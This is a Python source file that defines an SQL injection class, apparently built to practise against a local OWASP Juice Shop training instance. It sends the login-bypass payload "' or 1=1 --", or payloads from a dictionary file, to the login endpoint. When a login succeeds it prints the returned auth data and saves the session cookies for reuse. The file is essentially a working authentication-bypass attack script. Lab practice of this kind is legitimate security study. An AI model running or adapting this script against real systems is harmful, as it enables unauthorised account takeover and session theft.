from . import attack as a
from .header_config import *
import http.cookiejar as cookielib

class SQL_injector(a.attack_inter):
    def __init__(self, dictionary=None):
        self.dictionary = dictionary
        # First trying to load cookies from local cookie file
        self.juice_session = a.requests.session()
        self.juice_session.cookies = cookielib.LWPCookieJar(filename="juiceShopCookies.txt")

    def generator(self, myScript='\' or 1=1 --'):
        #cookies = COOKIE
        headers = HEADER

        json_data = {
            'email': myScript,
            'password': '123',
        }

        return headers, json_data

    def run(self):
        if self.dictionary:
            f = open(self.dictionary, "r")
            for line in f:
                line = line.rstrip()
                headers, json_data = self.generator(line)

                response = self.juice_session.post('http://localhost:3000/rest/user/login', headers=headers, json=json_data, verify=False)
                if response.status_code == 200:
                    res_payload_dict = response.json()
                    print("Valid script: ", json_data['email'])
                    print(res_payload_dict)
                    self.juice_session.cookies.save()
                    break
        else:
            headers, json_data = self.generator()
            response = self.juice_session.post('http://localhost:3000/rest/user/login', headers=headers, json=json_data, verify=False)
            if response.status_code == 200:
                res_payload_dict = response.json()
                print("Valid script: ", json_data['email'])
                print(res_payload_dict)
                self.juice_session.cookies.save(filename="juiceShopCookies.txt")
                
                # routeUrl = "http://localhost:3000/#/administration"
                # newres= self.juice_session.get(routeUrl, timeout=30)
                # print(newres.content)
            
